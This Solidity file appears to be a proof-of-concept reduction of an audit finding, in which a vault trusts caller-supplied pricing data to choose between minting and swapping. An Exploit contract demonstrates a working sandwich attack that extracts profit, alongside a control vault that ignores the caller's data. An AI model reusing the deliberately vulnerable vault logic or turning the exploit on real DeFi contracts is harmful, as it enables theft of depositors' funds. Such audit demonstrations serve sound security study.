// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* AdapterVault pregen_info (0x52, 55659).
   Cheatcode-free reduction. A proposer-supplied PregenInfo decides mint versus
   swap. The attacker crashes the PT price, forces the vault to buy PT in the
   pool, then sells the PT back. Ignoring the caller data mints 1:1 instead. */

contract Erc20 {
    string public name;
    string public symbol;
    uint8 public decimals = 0;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    Erc20 public pt;
    Erc20 public asset;
    uint256 public ptReserve;
    uint256 public assetReserve;

    constructor(Erc20 p, Erc20 a) {
        pt = p;
        asset = a;
        pt.mint(address(this), 10000);
        asset.mint(address(this), 10000);
        ptReserve = 10000;
        assetReserve = 10000;
    }

    function quoteAssetToPt(uint256 assetIn) public view returns (uint256) {
        uint256 newAsset = assetReserve + assetIn;
        uint256 newPt = ptReserve * assetReserve / newAsset;
        return ptReserve - newPt;
    }

    function swapAssetForPt(uint256 assetIn) external returns (uint256 ptOut) {
        require(asset.transferFrom(msg.sender, address(this), assetIn), "asset in");
        uint256 newAsset = assetReserve + assetIn;
        uint256 newPt = ptReserve * assetReserve / newAsset;
        ptOut = ptReserve - newPt;
        ptReserve = newPt;
        assetReserve = newAsset;
        require(pt.transfer(msg.sender, ptOut), "pt out");
    }

    function swapPtForAsset(uint256 ptIn) external returns (uint256 assetOut) {
        require(pt.transferFrom(msg.sender, address(this), ptIn), "pt in");
        uint256 newPt = ptReserve + ptIn;
        uint256 newAsset = ptReserve * assetReserve / newPt;
        assetOut = assetReserve - newAsset;
        ptReserve = newPt;
        assetReserve = newAsset;
        require(asset.transfer(msg.sender, assetOut), "asset out");
    }
}

contract AdapterVault {
    Erc20 public asset;
    Erc20 public pt;
    Pool public pool;
    bool public immutable trustCaller;
    uint256 public lastPtOut;

    constructor(Erc20 a, Erc20 p, Pool pool_, bool trust) {
        asset = a;
        pt = p;
        pool = pool_;
        trustCaller = trust;
        asset.mint(address(this), 5000);
        asset.approve(address(pool_), type(uint256).max);
    }

    function balanceAdapters(uint256 assetAmount, bytes calldata pregenInfo) external returns (uint256 ptOut) {
        uint256 mintReturns;
        uint256 spotReturns;
        if (trustCaller && pregenInfo.length > 0) {
            (mintReturns, spotReturns) = abi.decode(pregenInfo, (uint256, uint256));
        } else {
            mintReturns = assetAmount;
            spotReturns = pool.quoteAssetToPt(assetAmount);
        }
        // @> VULN: caller mint_returns and spot_returns choose mint versus the pool swap
        if (mintReturns > spotReturns) {
            ptOut = assetAmount;
            pt.mint(address(this), ptOut);
        } else {
            ptOut = pool.swapAssetForPt(assetAmount);
        }
        lastPtOut = ptOut;
    }
}

contract Exploit {
    Erc20 public pt;
    Erc20 public asset;
    Erc20 public assetB;
    Pool public pool;
    Pool public poolB;
    AdapterVault public vault;
    AdapterVault public vaultB;
    uint256 public bought;
    uint256 public vaultPt;
    uint256 public sold;
    uint256 public profit;
    uint256 public controlPt;
    uint256 public controlBack;

    constructor() {
        pt = new Erc20("Principal", "PT");
        asset = new Erc20("Asset", "ASSET");
        assetB = new Erc20("Asset B", "ASSETB");
        pool = new Pool(pt, asset);
        poolB = new Pool(pt, assetB);
        vault = new AdapterVault(asset, pt, pool, true);
        vaultB = new AdapterVault(assetB, pt, poolB, false);
        asset.mint(address(this), 5000);
        assetB.mint(address(this), 5000);
    }

    function run() external {
        uint256 start = asset.balanceOf(address(this));
        asset.approve(address(pool), 5000);
        bought = pool.swapAssetForPt(5000);
        require(bought == 3334, "front run");
        bytes memory lie = abi.encode(uint256(0), uint256(1));
        vaultPt = vault.balanceAdapters(5000, lie);
        require(vaultPt == 1667, "vault bought few PT");
        pt.approve(address(pool), bought);
        sold = pool.swapPtForAsset(bought);
        require(sold == 8002, "back run");
        profit = sold - 5000;
        require(profit == 3002, "extracted");
        require(asset.balanceOf(address(this)) == start + profit, "balance");
        assetB.approve(address(poolB), 5000);
        uint256 boughtB = poolB.swapAssetForPt(5000);
        controlPt = vaultB.balanceAdapters(5000, lie);
        require(controlPt == 5000, "control minted");
        pt.approve(address(poolB), boughtB);
        controlBack = poolB.swapPtForAsset(boughtB);
        require(controlBack == 5001, "control dust");
        require(controlBack - 5000 == 1, "no sandwich");
    }
}
